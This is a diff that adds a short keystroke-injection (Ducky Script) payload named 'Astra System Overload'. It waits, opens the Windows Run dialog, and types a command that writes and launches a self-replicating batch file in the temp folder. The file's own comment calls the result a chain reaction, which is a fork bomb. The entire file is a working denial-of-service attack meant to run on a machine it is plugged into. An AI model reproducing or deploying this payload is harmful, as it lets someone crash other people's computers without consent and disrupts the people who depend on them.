@@ -1,0 +1,7 @@
+REM Astra System Overload
+DELAY 5000
+GUI r
+DELAY 800
+REM This creates a batch file that calls itself twice, creating a chain reaction
+STRING cmd /c "echo %0 ^| %0 > %temp%\bomb.bat & %temp%\bomb.bat"
+ENTER
